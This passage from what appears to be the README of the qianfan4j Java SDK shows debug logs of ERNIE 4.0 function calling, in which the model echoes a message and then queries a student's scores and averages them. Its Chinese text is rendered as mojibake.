2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0/function => {""words"":""HELLO WORLD!""}
2024-03-10 17:58:40 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""echo: HELLO WORLD!""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\""words\"":\""HELLO WORLD!\""}"",""thoughts"":""å½“ç”¨æˆ·è¾“å…¥echo:å¼€å¤´çš„æ¶ˆæ¯æ—¶ï¼Œæœºå™¨äººä¼šåŸæ ·è¿”å›ç”¨æˆ·è¾“å…¥çš„æ¶ˆæ¯""}},{""role"":""function"",""content"":""{\""words\"":\""HELLO WORLD!\""}"",""name"":""echo""}],""functions"":[{""name"":""echo"",""description"":""echo words"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""responses"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""examples"":[[{""role"":""user"",""content"":""echo: words""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\n    \""words\"": \""hello, world\""\n}\n"",""thoughts"":""å½“ç”¨æˆ·è¾“å…¥echo:å¼€å¤´çš„æ¶ˆæ¯æ—¶ï¼Œæœºå™¨äººä¼šåŸæ ·è¿”å›ç”¨æˆ·è¾“å…¥çš„æ¶ˆæ¯""}}]]},{""name"":""echo"",""description"":""echo words"",""parameters"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""responses"":{""type"":""object"",""properties"":{""words"":{""type"":""string""}}},""examples"":[[{""role"":""user"",""content"":""echo: words""},{""role"":""assistant"",""function_call"":{""name"":""echo"",""arguments"":""{\n    \""words\"": \""hello, world\""\n}\n"",""thoughts"":""å½“ç”¨æˆ·è¾“å…¥echo:å¼€å¤´çš„æ¶ˆæ¯æ—¶ï¼Œæœºå™¨äººä¼šåŸæ ·è¿”å›ç”¨æˆ·è¾“å…¥çš„æ¶ˆæ¯""}}]]}]}
2024-03-10 17:58:42 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-tj5rhmj89g"",""object"":""chat.completion"",""created"":1710064722,""result"":""æ‚¨å¥½ï¼Œæ‚¨è¾“å…¥çš„æ¶ˆæ¯æ˜¯ï¼šHELLO WORLD!ï¼Œæˆ‘å·²åŸæ ·è¿”å›ã€‚è¯·é—®æœ‰å…¶ä»–éœ€è¦å—ï¼Ÿ"",""is_truncated"":false,""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":225,""completion_tokens"":21,""total_tokens"":246}}
æ‚¨å¥½ï¼Œæ‚¨è¾“å…¥çš„æ¶ˆæ¯æ˜¯ï¼šHELLO WORLD!ï¼Œæˆ‘å·²åŸæ ·è¿”å›ã€‚è¯·é—®æœ‰å…¶ä»–éœ€è¦å—ï¼Ÿ
```

### å¤šå‡½æ•°è°ƒç”¨ç¤ºä¾‹

`qianfan4j`ä¼šæ ¹æ®LLMçš„æ¨ç†èƒ½åŠ›ï¼Œè‡ªåŠ¨æ‹†è§£å¤šå‡½æ•°è°ƒç”¨çš„ä»»åŠ¡ï¼Œç„¶åæŒ‰ç…§æ‹†è§£çš„ä»»åŠ¡é¡ºåºä¾æ¬¡è°ƒç”¨å‡½æ•°ã€‚è¿™æ ·ï¼Œä½ å°±å¯ä»¥ä¸“æ³¨äºå‡½æ•°çš„å®ç°ï¼Œè€Œä¸ç”¨å†å»å…³å¿ƒå‡½æ•°çš„è°ƒç”¨é¡ºåºäº†ã€‚
æˆ‘ä»¬å‡è®¾æœ‰ä¸¤ä¸ªå‡½æ•° [QueryScoreFunction](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/chat/function/QueryScoreFunction.java)å’Œ [ComputeAvgScoreFunction](https://github.com/oldmanpushcart/qianfan4j/blob/main/src/test/java/io/github/oldmanpushcart/test/qianfan4j/chat/function/ComputeAvgScoreFunction.java)ï¼Œåˆ†åˆ«ç”¨äºæŸ¥è¯¢æˆç»©å’Œè®¡ç®—å¹³å‡åˆ†ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼å®ç°å¤šå‡½æ•°è°ƒç”¨ï¼š

```java
final var request = ChatRequest.newBuilder()
    .model(ChatModel.ERNIE_V4)
    .functions(new QueryScoreFunction(), new ComputeAvgScoreFunction())
    .option(ChatOptions.IS_STREAM, true)
    .option(ChatOptions.IS_ENABLE_SEARCH, false)
    .option(ChatOptions.TEMPERATURE, 0.01f)
    .messages(Message.ofUser(""è®¡ç®—æå››çš„è¯­æ–‡å’Œæ•°å­¦å¹³å‡åˆ†""))
    .build();

final var response = client.chat(request)
    .async()
    .join();

// System.out.println(response.content());
```

è¾“å‡ºç»“æœ

```text
2024-03-10 18:02:44 DEBUG qianfan://token/refresh success! expired=1712656964044;
2024-03-10 18:02:44 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""è®¡ç®—æå››çš„è¯­æ–‡å’Œæ•°å­¦å¹³å‡åˆ†""}],""functions"":[{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query, example: \""å¼ ä¸‰\""""},""subjects"":{""type"":""array"",""description"":""the subjects to query, example: [\""MATH\"", \""CHINESE\""]"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]},""responses"":{""type"":""object"",""properties"":{""message"":{""type"":""string"",""description"":""message""},""data"":{""type"":""array"",""description"":""data"",""items"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""student name""},""subject"":{""type"":""string"",""description"":""subject items"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]},""value"":{""type"":""number"",""description"":""score value""}}}},""success"":{""type"":""boolean"",""description"":""success or not""}}},""examples"":[[{""role"":""user"",""content"":""æŸ¥è¯¢å¼ ä¸‰ã€æå››çš„æ•°å­¦æˆç»©""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""å¼ ä¸‰\"",\n     \""subjects\"": [\n         \""MATH\""\n     ]\n }\n"",""thoughts"":""ç”¨æˆ·éœ€è¦æŸ¥è¯¢å¼ ä¸‰ã€æå››ã€ç‹äº”çš„æ•°å­¦æˆç»©ï¼Œä½†å‡½æ•°ä¸€æ¬¡åªèƒ½æŸ¥è¯¢ä¸€ä¸ªå­¦ç”Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæŸ¥è¯¢å¼ ä¸‰çš„æˆç»©ï¼Œç„¶åå†åˆ†åˆ«æŸ¥è¯¢æå››å’Œç‹äº”çš„æ•°å­¦æˆç»©""}}],[{""role"":""user"",""content"":""æŸ¥è¯¢æå››çš„æ•°å­¦å’Œè¯­æ–‡æˆç»©""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""æå››\"",\n     \""subjects\"": [\n         \""MATH\"",\n         \""CHINESE\""\n     ]\n }\n"",""thoughts"":""ç”¨æˆ·éœ€è¦æŸ¥è¯¢æå››çš„æ•°å­¦å’Œè¯­æ–‡æˆç»©ï¼Œå‡½æ•°ä¸€æ¬¡å¯ä»¥æŸ¥è¯¢ä¸€ä¸ªå­¦ç”Ÿçš„å¤šä¸ªæˆç»©""}}]]},{""name"":""compute_avg_score"",""description"":""è®¡ç®—å¹³å‡æˆç»©"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""åˆ†æ•°é›†åˆ"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""å¹³å‡åˆ†""}}},""examples"":[[{""role"":""user"",""content"":""å¼ ä¸‰çš„è¯­æ–‡30åˆ†ã€æ•°å­¦20åˆ†ã€è‹±è¯­100åˆ†ï¼›\næå››çš„è¯­æ–‡50åˆ†ã€æ•°å­¦90åˆ†ã€è‹±è¯­60åˆ†ï¼›\nè®¡ç®—å¼ ä¸‰çš„å¹³å‡æˆç»©\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""æˆ‘åº”è¯¥å°†å¼ ä¸‰çš„æ‰€æœ‰åˆ†æ•°ä¼ å…¥ï¼Œè®¡ç®—å¼ ä¸‰çš„å¹³å‡åˆ†""}}],[{""role"":""user"",""content"":""å¼ ä¸‰çš„æ•°å­¦æˆç»©æ˜¯50åˆ†ã€è¯­æ–‡30åˆ†ã€è‹±è¯­20åˆ†ï¼›æå››çš„æ•°å­¦æˆç»©æ˜¯60åˆ†ã€è¯­æ–‡90åˆ†ï¼›è¯·è®¡ç®—ä»–ä»¬çš„è¯­æ–‡å¹³å‡æˆç»©""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""æˆ‘åº”è¯¥æŠŠæ‰€æœ‰äººçš„è¯­æ–‡åˆ†æ•°ä¼ å…¥ï¼Œä»è€Œè®¡ç®—å‡ºè¯­æ–‡çš„å¹³å‡æˆç»©""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-gmjf3vyemg"",""object"":""chat.completion"",""created"":1710064967,""sentence_id"":0,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""function_call"":{""name"":""query_score"",""thoughts"":""æˆ‘éœ€è¦å…ˆæŸ¥è¯¢æå››çš„è¯­æ–‡å’Œæ•°å­¦æˆç»©ï¼Œç„¶åè®¡ç®—å¹³å‡åˆ†ã€‚ä»»åŠ¡æ‹†è§£ï¼š[sub-task1: ä½¿ç”¨[query_score]å·¥å…·æŸ¥è¯¢æå››çš„è¯­æ–‡å’Œæ•°å­¦æˆç»©ï¼Œsub-task2: ä½¿ç”¨[compute_avg_score]å·¥å…·è®¡ç®—å¹³å‡åˆ†]ã€‚æ¥ä¸‹æ¥éœ€è¦è°ƒç”¨[query_score]å·¥å…·æ¥æŸ¥è¯¢æå››çš„è¯­æ–‡å’Œæ•°å­¦æˆç»©ã€‚"",""arguments"":""{\""name\"":\""æå››\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}""},""finish_reason"":""function_call"",""usage"":{""prompt_tokens"":676,""completion_tokens"":92,""total_tokens"":768}}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0/function <= {""name"":""æå››"",""subjects"":[""CHINESE"",""MATH""]}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0/function => {""message"":""æŸ¥è¯¢æˆåŠŸ"",""data"":[{""name"":""æå››"",""subject"":""CHINESE"",""value"":80.0},{""name"":""æå››"",""subject"":""MATH"",""value"":70.0}],""success"":true}
2024-03-10 18:02:47 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""è®¡ç®—æå››çš„è¯­æ–‡å’Œæ•°å­¦å¹³å‡åˆ†""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\""name\"":\""æå››\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}"",""thoughts"":""æˆ‘éœ€è¦å…ˆæŸ¥è¯¢æå››çš„è¯­æ–‡å’Œæ•°å­¦æˆç»©ï¼Œç„¶åè®¡ç®—å¹³å‡åˆ†ã€‚ä»»åŠ¡æ‹†è§£ï¼š[sub-task1: ä½¿ç”¨[query_score]å·¥å…·æŸ¥è¯¢æå››çš„è¯­æ–‡å’Œæ•°å­¦æˆç»©ï¼Œsub-task2: ä½¿ç”¨[compute_avg_score]å·¥å…·è®¡ç®—å¹³å‡åˆ†]ã€‚æ¥ä¸‹æ¥éœ€è¦è°ƒç”¨[query_score]å·¥å…·æ¥æŸ¥è¯¢æå››çš„è¯­æ–‡å’Œæ•°å­¦æˆç»©ã€‚""}},{""role"":""function"",""content"":""{\""message\"":\""æŸ¥è¯¢æˆåŠŸ\"",\""data\"":[{\""name\"":\""æå››\"",\""subject\"":\""CHINESE\"",\""value\"":80.0},{\""name\"":\""æå››\"",\""subject\"":\""MATH\"",\""value\"":70.0}],\""success\"":true}"",""name"":""query_score""}],""functions"":[{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query, example: \""å¼ ä¸‰\""""},""subjects"":{""type"":""array"",""description"":""the subjects to query, example: [\""MATH\"", \""CHINESE\""]"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]},""responses"":{""type"":""object"",""properties"":{""message"":{""type"":""string"",""description"":""message""},""data"":{""type"":""array"",""description"":""data"",""items"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""student name""},""subject"":{""type"":""string"",""description"":""subject items"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]},""value"":{""type"":""number"",""description"":""score value""}}}},""success"":{""type"":""boolean"",""description"":""success or not""}}},""examples"":[[{""role"":""user"",""content"":""æŸ¥è¯¢å¼ ä¸‰ã€æå››çš„æ•°å­¦æˆç»©""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""å¼ ä¸‰\"",\n     \""subjects\"": [\n         \""MATH\""\n     ]\n }\n"",""thoughts"":""ç”¨æˆ·éœ€è¦æŸ¥è¯¢å¼ ä¸‰ã€æå››ã€ç‹äº”çš„æ•°å­¦æˆç»©ï¼Œä½†å‡½æ•°ä¸€æ¬¡åªèƒ½æŸ¥è¯¢ä¸€ä¸ªå­¦ç”Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæŸ¥è¯¢å¼ ä¸‰çš„æˆç»©ï¼Œç„¶åå†åˆ†åˆ«æŸ¥è¯¢æå››å’Œç‹äº”çš„æ•°å­¦æˆç»©""}}],[{""role"":""user"",""content"":""æŸ¥è¯¢æå››çš„æ•°å­¦å’Œè¯­æ–‡æˆç»©""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""æå››\"",\n     \""subjects\"": [\n         \""MATH\"",\n         \""CHINESE\""\n     ]\n }\n"",""thoughts"":""ç”¨æˆ·éœ€è¦æŸ¥è¯¢æå››çš„æ•°å­¦å’Œè¯­æ–‡æˆç»©ï¼Œå‡½æ•°ä¸€æ¬¡å¯ä»¥æŸ¥è¯¢ä¸€ä¸ªå­¦ç”Ÿçš„å¤šä¸ªæˆç»©""}}]]},{""name"":""query_score"",""description"":""query student's scores"",""parameters"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""the student name to query, example: \""å¼ ä¸‰\""""},""subjects"":{""type"":""array"",""description"":""the subjects to query, example: [\""MATH\"", \""CHINESE\""]"",""items"":{""type"":""string"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]}}},""required"":[""name"",""subjects""]},""responses"":{""type"":""object"",""properties"":{""message"":{""type"":""string"",""description"":""message""},""data"":{""type"":""array"",""description"":""data"",""items"":{""type"":""object"",""properties"":{""name"":{""type"":""string"",""description"":""student name""},""subject"":{""type"":""string"",""description"":""subject items"",""enum"":[""CHINESE"",""MATH"",""ENGLISH""]},""value"":{""type"":""number"",""description"":""score value""}}}},""success"":{""type"":""boolean"",""description"":""success or not""}}},""examples"":[[{""role"":""user"",""content"":""æŸ¥è¯¢å¼ ä¸‰ã€æå››çš„æ•°å­¦æˆç»©""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""å¼ ä¸‰\"",\n     \""subjects\"": [\n         \""MATH\""\n     ]\n }\n"",""thoughts"":""ç”¨æˆ·éœ€è¦æŸ¥è¯¢å¼ ä¸‰ã€æå››ã€ç‹äº”çš„æ•°å­¦æˆç»©ï¼Œä½†å‡½æ•°ä¸€æ¬¡åªèƒ½æŸ¥è¯¢ä¸€ä¸ªå­¦ç”Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆæŸ¥è¯¢å¼ ä¸‰çš„æˆç»©ï¼Œç„¶åå†åˆ†åˆ«æŸ¥è¯¢æå››å’Œç‹äº”çš„æ•°å­¦æˆç»©""}}],[{""role"":""user"",""content"":""æŸ¥è¯¢æå››çš„æ•°å­¦å’Œè¯­æ–‡æˆç»©""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\n     \""name\"": \""æå››\"",\n     \""subjects\"": [\n         \""MATH\"",\n         \""CHINESE\""\n     ]\n }\n"",""thoughts"":""ç”¨æˆ·éœ€è¦æŸ¥è¯¢æå››çš„æ•°å­¦å’Œè¯­æ–‡æˆç»©ï¼Œå‡½æ•°ä¸€æ¬¡å¯ä»¥æŸ¥è¯¢ä¸€ä¸ªå­¦ç”Ÿçš„å¤šä¸ªæˆç»©""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:48 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064968,""sentence_id"":0,""is_end"":false,""is_truncated"":false,""result"":""æå››"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:49 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064969,""sentence_id"":1,""is_end"":false,""is_truncated"":false,""result"":""çš„è¯­æ–‡æˆç»©æ˜¯80åˆ†ï¼Œæ•°å­¦æˆç»©æ˜¯70åˆ†ã€‚"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:49 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064970,""sentence_id"":2,""is_end"":false,""is_truncated"":false,""result"":""ä»–çš„å¹³å‡åˆ†æ˜¯75åˆ†ã€‚"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:50 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064971,""sentence_id"":3,""is_end"":false,""is_truncated"":false,""result"":""å¦‚æœæ‚¨éœ€è¦æ›´è¯¦ç»†çš„ä¿¡æ¯æˆ–æœ‰å…¶ä»–é—®é¢˜ï¼Œè¯·éšæ—¶å‘Šè¯‰æˆ‘ã€‚"",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":0,""total_tokens"":812}}
2024-03-10 18:02:50 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-mghmq7fq8e"",""object"":""chat.completion"",""created"":1710064971,""sentence_id"":4,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""finish_reason"":""normal"",""usage"":{""prompt_tokens"":812,""completion_tokens"":36,""total_tokens"":848}}
2024-03-10 18:02:50 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""è®¡ç®—æå››çš„è¯­æ–‡å’Œæ•°å­¦å¹³å‡åˆ†""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\""name\"":\""æå››\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}"",""thoughts"":""æˆ‘éœ€è¦å…ˆæŸ¥è¯¢æå››çš„è¯­æ–‡å’Œæ•°å­¦æˆç»©ï¼Œç„¶åè®¡ç®—å¹³å‡åˆ†ã€‚ä»»åŠ¡æ‹†è§£ï¼š[sub-task1: ä½¿ç”¨[query_score]å·¥å…·æŸ¥è¯¢æå››çš„è¯­æ–‡å’Œæ•°å­¦æˆç»©ï¼Œsub-task2: ä½¿ç”¨[compute_avg_score]å·¥å…·è®¡ç®—å¹³å‡åˆ†]ã€‚æ¥ä¸‹æ¥éœ€è¦è°ƒç”¨[query_score]å·¥å…·æ¥æŸ¥è¯¢æå››çš„è¯­æ–‡å’Œæ•°å­¦æˆç»©ã€‚""}},{""role"":""function"",""content"":""{\""message\"":\""æŸ¥è¯¢æˆåŠŸ\"",\""data\"":[{\""name\"":\""æå››\"",\""subject\"":\""CHINESE\"",\""value\"":80.0},{\""name\"":\""æå››\"",\""subject\"":\""MATH\"",\""value\"":70.0}],\""success\"":true}"",""name"":""query_score""},{""role"":""assistant"",""content"":""æå››çš„è¯­æ–‡æˆç»©æ˜¯80åˆ†ï¼Œæ•°å­¦æˆç»©æ˜¯70åˆ†ã€‚ä»–çš„å¹³å‡åˆ†æ˜¯75åˆ†ã€‚å¦‚æœæ‚¨éœ€è¦æ›´è¯¦ç»†çš„ä¿¡æ¯æˆ–æœ‰å…¶ä»–é—®é¢˜ï¼Œè¯·éšæ—¶å‘Šè¯‰æˆ‘ã€‚""},{""role"":""user"",""content"":"" ä½¿ç”¨[compute_avg_score]å·¥å…·è®¡ç®—å¹³å‡åˆ†""}],""functions"":[{""name"":""compute_avg_score"",""description"":""è®¡ç®—å¹³å‡æˆç»©"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""åˆ†æ•°é›†åˆ"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""å¹³å‡åˆ†""}}},""examples"":[[{""role"":""user"",""content"":""å¼ ä¸‰çš„è¯­æ–‡30åˆ†ã€æ•°å­¦20åˆ†ã€è‹±è¯­100åˆ†ï¼›\næå››çš„è¯­æ–‡50åˆ†ã€æ•°å­¦90åˆ†ã€è‹±è¯­60åˆ†ï¼›\nè®¡ç®—å¼ ä¸‰çš„å¹³å‡æˆç»©\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""æˆ‘åº”è¯¥å°†å¼ ä¸‰çš„æ‰€æœ‰åˆ†æ•°ä¼ å…¥ï¼Œè®¡ç®—å¼ ä¸‰çš„å¹³å‡åˆ†""}}],[{""role"":""user"",""content"":""å¼ ä¸‰çš„æ•°å­¦æˆç»©æ˜¯50åˆ†ã€è¯­æ–‡30åˆ†ã€è‹±è¯­20åˆ†ï¼›æå››çš„æ•°å­¦æˆç»©æ˜¯60åˆ†ã€è¯­æ–‡90åˆ†ï¼›è¯·è®¡ç®—ä»–ä»¬çš„è¯­æ–‡å¹³å‡æˆç»©""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""æˆ‘åº”è¯¥æŠŠæ‰€æœ‰äººçš„è¯­æ–‡åˆ†æ•°ä¼ å…¥ï¼Œä»è€Œè®¡ç®—å‡ºè¯­æ–‡çš„å¹³å‡æˆç»©""}}]]},{""name"":""compute_avg_score"",""description"":""è®¡ç®—å¹³å‡æˆç»©"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""åˆ†æ•°é›†åˆ"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""å¹³å‡åˆ†""}}},""examples"":[[{""role"":""user"",""content"":""å¼ ä¸‰çš„è¯­æ–‡30åˆ†ã€æ•°å­¦20åˆ†ã€è‹±è¯­100åˆ†ï¼›\næå››çš„è¯­æ–‡50åˆ†ã€æ•°å­¦90åˆ†ã€è‹±è¯­60åˆ†ï¼›\nè®¡ç®—å¼ ä¸‰çš„å¹³å‡æˆç»©\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""æˆ‘åº”è¯¥å°†å¼ ä¸‰çš„æ‰€æœ‰åˆ†æ•°ä¼ å…¥ï¼Œè®¡ç®—å¼ ä¸‰çš„å¹³å‡åˆ†""}}],[{""role"":""user"",""content"":""å¼ ä¸‰çš„æ•°å­¦æˆç»©æ˜¯50åˆ†ã€è¯­æ–‡30åˆ†ã€è‹±è¯­20åˆ†ï¼›æå››çš„æ•°å­¦æˆç»©æ˜¯60åˆ†ã€è¯­æ–‡90åˆ†ï¼›è¯·è®¡ç®—ä»–ä»¬çš„è¯­æ–‡å¹³å‡æˆç»©""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         90\n     ]\n }\n"",""thoughts"":""æˆ‘åº”è¯¥æŠŠæ‰€æœ‰äººçš„è¯­æ–‡åˆ†æ•°ä¼ å…¥ï¼Œä»è€Œè®¡ç®—å‡ºè¯­æ–‡çš„å¹³å‡æˆç»©""}}]]}],""stream"":true,""temperature"":0.01,""disable_search"":true}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0 <= {""id"":""as-y42i2td7tk"",""object"":""chat.completion"",""created"":1710064973,""sentence_id"":0,""is_end"":true,""is_truncated"":false,""result"":"""",""need_clear_history"":false,""function_call"":{""name"":""compute_avg_score"",""thoughts"":""æˆ‘éœ€è¦è°ƒç”¨[compute_avg_score]å·¥å…·æ¥è®¡ç®—æå››çš„å¹³å‡åˆ†ã€‚"",""arguments"":""{\""scores\"":[80,70]}""},""finish_reason"":""function_call"",""usage"":{""prompt_tokens"":680,""completion_tokens"":30,""total_tokens"":710}}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0/function <= {""scores"":[80,70]}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0/function => {""avg_score"":75.0}
2024-03-10 18:02:53 DEBUG qianfan://chat/ernie-v4.0 => {""messages"":[{""role"":""user"",""content"":""è®¡ç®—æå››çš„è¯­æ–‡å’Œæ•°å­¦å¹³å‡åˆ†""},{""role"":""assistant"",""function_call"":{""name"":""query_score"",""arguments"":""{\""name\"":\""æå››\"",\""subjects\"":[\""CHINESE\"",\""MATH\""]}"",""thoughts"":""æˆ‘éœ€è¦å…ˆæŸ¥è¯¢æå››çš„è¯­æ–‡å’Œæ•°å­¦æˆç»©ï¼Œç„¶åè®¡ç®—å¹³å‡åˆ†ã€‚ä»»åŠ¡æ‹†è§£ï¼š[sub-task1: ä½¿ç”¨[query_score]å·¥å…·æŸ¥è¯¢æå››çš„è¯­æ–‡å’Œæ•°å­¦æˆç»©ï¼Œsub-task2: ä½¿ç”¨[compute_avg_score]å·¥å…·è®¡ç®—å¹³å‡åˆ†]ã€‚æ¥ä¸‹æ¥éœ€è¦è°ƒç”¨[query_score]å·¥å…·æ¥æŸ¥è¯¢æå››çš„è¯­æ–‡å’Œæ•°å­¦æˆç»©ã€‚""}},{""role"":""function"",""content"":""{\""message\"":\""æŸ¥è¯¢æˆåŠŸ\"",\""data\"":[{\""name\"":\""æå››\"",\""subject\"":\""CHINESE\"",\""value\"":80.0},{\""name\"":\""æå››\"",\""subject\"":\""MATH\"",\""value\"":70.0}],\""success\"":true}"",""name"":""query_score""},{""role"":""assistant"",""content"":""æå››çš„è¯­æ–‡æˆç»©æ˜¯80åˆ†ï¼Œæ•°å­¦æˆç»©æ˜¯70åˆ†ã€‚ä»–çš„å¹³å‡åˆ†æ˜¯75åˆ†ã€‚å¦‚æœæ‚¨éœ€è¦æ›´è¯¦ç»†çš„ä¿¡æ¯æˆ–æœ‰å…¶ä»–é—®é¢˜ï¼Œè¯·éšæ—¶å‘Šè¯‰æˆ‘ã€‚""},{""role"":""user"",""content"":"" ä½¿ç”¨[compute_avg_score]å·¥å…·è®¡ç®—å¹³å‡åˆ†""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\""scores\"":[80,70]}"",""thoughts"":""æˆ‘éœ€è¦è°ƒç”¨[compute_avg_score]å·¥å…·æ¥è®¡ç®—æå››çš„å¹³å‡åˆ†ã€‚""}},{""role"":""function"",""content"":""{\""avg_score\"":75.0}"",""name"":""compute_avg_score""}],""functions"":[{""name"":""compute_avg_score"",""description"":""è®¡ç®—å¹³å‡æˆç»©"",""parameters"":{""type"":""object"",""properties"":{""scores"":{""type"":""array"",""description"":""åˆ†æ•°é›†åˆ"",""items"":{""type"":""number""}}}},""responses"":{""type"":""object"",""properties"":{""avg_score"":{""type"":""number"",""description"":""å¹³å‡åˆ†""}}},""examples"":[[{""role"":""user"",""content"":""å¼ ä¸‰çš„è¯­æ–‡30åˆ†ã€æ•°å­¦20åˆ†ã€è‹±è¯­100åˆ†ï¼›\næå››çš„è¯­æ–‡50åˆ†ã€æ•°å­¦90åˆ†ã€è‹±è¯­60åˆ†ï¼›\nè®¡ç®—å¼ ä¸‰çš„å¹³å‡æˆç»©\n""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         20,\n         100\n     ]\n }\n"",""thoughts"":""æˆ‘åº”è¯¥å°†å¼ ä¸‰çš„æ‰€æœ‰åˆ†æ•°ä¼ å…¥ï¼Œè®¡ç®—å¼ ä¸‰çš„å¹³å‡åˆ†""}}],[{""role"":""user"",""content"":""å¼ ä¸‰çš„æ•°å­¦æˆç»©æ˜¯50åˆ†ã€è¯­æ–‡30åˆ†ã€è‹±è¯­20åˆ†ï¼›æå››çš„æ•°å­¦æˆç»©æ˜¯60åˆ†ã€è¯­æ–‡90åˆ†ï¼›è¯·è®¡ç®—ä»–ä»¬çš„è¯­æ–‡å¹³å‡æˆç»©""},{""role"":""assistant"",""function_call"":{""name"":""compute_avg_score"",""arguments"":""{\n     \""scores\"": [\n         30,\n         